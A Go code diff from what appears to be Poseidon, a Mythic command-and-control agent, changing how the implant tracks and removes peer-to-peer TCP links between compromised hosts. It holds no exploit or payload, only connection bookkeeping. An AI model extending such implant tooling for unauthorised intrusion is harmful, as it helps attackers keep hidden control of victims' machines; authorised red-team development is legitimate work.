@@ -15,6 +15,7 @@ import (
 var (
 	internalTCPConnections     = make(map[string]*net.Conn)
 	internalTCPConnectionMutex sync.RWMutex
+	internalTCPMapping         = make(map[string]string)
 )
 
 type poseidonTCP struct {
@@ -31,6 +32,7 @@ func (c poseidonTCP) ProcessIngressMessageForP2P(delegate *structs.DelegateMessa
 			// Mythic told us that our UUID was fake and gave the right one
 			utils.PrintDebug(fmt.Sprintf("adding new MythicUUID: %s from %s\n", delegate.MythicUUID, delegate.UUID))
 			internalTCPConnections[delegate.MythicUUID] = conn
+			internalTCPMapping[delegate.UUID] = delegate.MythicUUID
 			// remove our old one
 			utils.PrintDebug(fmt.Sprintf("removing internal tcp connection for: %s\n", delegate.UUID))
 			delete(internalTCPConnections, delegate.UUID)
@@ -53,11 +55,25 @@ func (c poseidonTCP) RemoveInternalConnection(connectionUUID string) bool {
 		(*conn).Close()
 		delete(internalTCPConnections, connectionUUID)
 		//fmt.Printf("connection removed, %s\n", connectionUUID)
-		//printInternalTCPConnectionMap()
+		//utils.PrintDebug(c.GetInternalP2PMap())
+		select {
+		case RemoveInternalConnectionChannel <- structs.RemoveInternalConnectionMessage{
+			ConnectionUUID: connectionUUID,
+			C2ProfileName:  "poseidon_tcp",
+		}:
+		}
+		return true
+	} else if mythicUUID, ok := internalTCPMapping[connectionUUID]; ok {
+		select {
+		case RemoveInternalConnectionChannel <- structs.RemoveInternalConnectionMessage{
+			ConnectionUUID: mythicUUID,
+			C2ProfileName:  "poseidon_tcp",
+		}:
+		}
 		return true
 	} else {
 		// we don't know about this connection we're asked to close
-		return true
+		return false
 	}
 }
 func (c poseidonTCP) AddInternalConnection(connection interface{}) {
